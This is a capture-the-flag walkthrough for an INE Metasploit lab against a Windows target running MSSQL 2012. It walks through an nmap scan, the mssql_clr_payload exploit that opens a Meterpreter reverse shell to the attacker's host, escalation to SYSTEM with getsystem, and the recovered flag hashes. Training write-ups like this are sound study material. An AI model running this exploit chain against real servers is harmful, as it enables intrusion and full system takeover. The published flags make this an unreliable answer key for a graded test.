---
aliases:
  - "Host & Network Penetration Testing: The Metasploit Framework CTF 1"
---
## Overview

Windows systems are common targets in penetration testing due to their extensive use in corporate environments. This lab focuses on exploiting Windows-based services and configurations using the Metasploit Framework (MSF). Participants will gain hands-on experience accessing vulnerable services, exploring sensitive directories, and escalating privileges to retrieve hidden information.

The objective is to highlight the risks associated with misconfigured accounts, exposed directories, and improper privilege management in Windows environments.

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.


## Walkthrough

1. Let's scan the target

```bash
┌──(root㉿INE)-[~]
└─# nmap -sS -sV target.ine.local 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 00:07 IST
Nmap scan report for target.ine.local (10.5.26.183)
Host is up (0.0016s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.44 seconds

```

2. So searching for `mssql 2012` I found this exploit. let's check if it is vulnerable or not.

```bash
msf6 > setg RHOSTS target.ine.local
RHOSTS => target.ine.local
msf6 > search mssql 2012

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/mssql/mssql_clr_payload      1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   1  exploit/windows/mssql/mssql_linkcrawler      2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   2  post/windows/manage/mssql_local_auth_bypass  .                normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass


Interact with a module by name or index. For example info 2, use 2 or use post/windows/manage/mssql_local_auth_bypass

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.36.4:4444 
[!] 10.5.26.183:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[-] 10.5.26.183:1433 - Exploit aborted due to failure: bad-config: Target SQL server arch is x64, payload architecture is x86
[*] Exploit completed, but no session was created.
msf6 exploit(windows/mssql/mssql_clr_payload) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.36.4:4444 
[!] 10.5.26.183:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] 10.5.26.183:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] 10.5.26.183:1433 - Database does not have CLR support enabled, enabling ...
[*] 10.5.26.183:1433 - Using version v3.5 of the Payload Assembly
[*] 10.5.26.183:1433 - Adding custom payload assembly ...
[*] 10.5.26.183:1433 - Exposing payload execution stored procedure ...
[*] 10.5.26.183:1433 - Executing the payload ...
[*] 10.5.26.183:1433 - Removing stored procedure ...
[*] 10.5.26.183:1433 - Removing assembly ...
[*] Sending stage (201798 bytes) to 10.5.26.183
[*] 10.5.26.183:1433 - Restoring CLR setting ...
[*] 10.5.26.183:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 1 opened (10.10.36.4:4444 -> 10.5.26.183:49300) at 2025-06-23 00:14:45 +0530

meterpreter > 

```

Okay we succesfully got access to the system

## **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.

```bash

meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2021-12-15 09:58:20 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
040777/rwxrwxrwx  0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2013-08-22 21:22:33 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2025-01-09 12:30:38 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2024-12-15 14:57:59 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2015-08-13 21:42:59 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2021-12-31 13:30:32 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-01-09 12:42:28 +0530  Users
040777/rwxrwxrwx  24576   dir   2025-01-09 12:38:38 +0530  Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2025-06-23 00:07:21 +0530  flag1.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag1.txt 
9fc620441278441a917f2bfedd9e462f
meterpreter > 


```
## **Flag 2:** Locate the second flag within the Windows configuration folder.

Before finding second flag let's elevate the priviledges to system level.

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuuid
[-] Unknown command: getuuid. Did you mean getuid? Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 524 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

Now to the flag that hints there is something in config directory

```bash
C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Windows\System32\config

06/22/2025  06:45 PM    <DIR>          .
06/22/2025  06:45 PM    <DIR>          ..
05/09/2014  12:52 AM           262,144 BCD-Template
06/22/2025  06:37 PM       101,187,584 COMPONENTS
08/22/2013  01:25 PM                 0 COMPONENTS.LOG
01/09/2025  07:13 AM         2,621,440 DEFAULT
08/22/2013  01:25 PM                 0 DEFAULT.LOG
06/22/2025  06:47 PM         4,521,984 DRIVERS
06/22/2025  06:37 PM                34 flag2.txt
08/22/2013  01:29 PM               164 FP
08/22/2013  01:25 PM    <DIR>          Journal
06/22/2025  06:45 PM    <DIR>          RegBack
01/09/2025  07:13 AM           262,144 SAM
01/09/2025  07:13 AM           262,144 SECURITY
08/22/2013  01:25 PM                 0 SECURITY.LOG
01/09/2025  07:13 AM        89,653,248 SOFTWARE
08/22/2013  01:25 PM                 0 SOFTWARE.LOG
01/09/2025  07:13 AM        12,582,912 SYSTEM
08/22/2013  01:25 PM                 0 SYSTEM.LOG
06/20/2014  07:56 PM    <DIR>          systemprofile
03/18/2014  10:32 AM    <DIR>          TxR
              15 File(s)    211,353,798 bytes
               6 Dir(s)   3,663,290,368 bytes free

C:\Windows\System32\config>cat flag2.txt
cat flag2.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\System32\config>type flag2.txt
type flag2.txt
828fc01fe9b84ae9a670076b9889973e

C:\Windows\System32\config>

```
## **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.

The question states that the third flag is also hidden within the **system** directory, but we don’t know its exact location. However, we know that the flag files end with `.txt`. To search for those files, use the following command: `dir C:\Windows\System32\*.txt /s /b`.

This command will search for all `.txt` files within the **System32** directory and its subdirectories.

```bash
meterpreter > shell
Process 1804 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\>cd Windows
cd Windows

C:\Windows>cd System32
cd System32

C:\Windows\System32>dir C:\Windows\System32\*.txt /s /b
dir C:\Windows\System32\*.txt /s /b
C:\Windows\System32\catroot2\dberr.txt
C:\Windows\System32\config\flag2.txt
C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
C:\Windows\System32\drivers\gmreadme.txt
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
C:\Windows\System32\en-US\erofflps.txt
C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt

C:\Windows\System32>type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
fb5a9234197a482183a8944625d43995

```
## **Flag 4:** Investigate the Administrator directory to find the fourth flag.

```bash
meterpreter > pwd
C:\
meterpreter > cd Users/Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2025-01-09 12:42:42 +0530  desktop.ini
100666/rw-rw-rw-  34    fil   2025-06-23 00:07:21 +0530  flag4.txt

meterpreter > cat flag4.txt 
47bac47d6cbc4d6c85e6eaf8629ff50c
meterpreter > fb5a9234197a482183a8944625d43995


```

Was easy to guess.

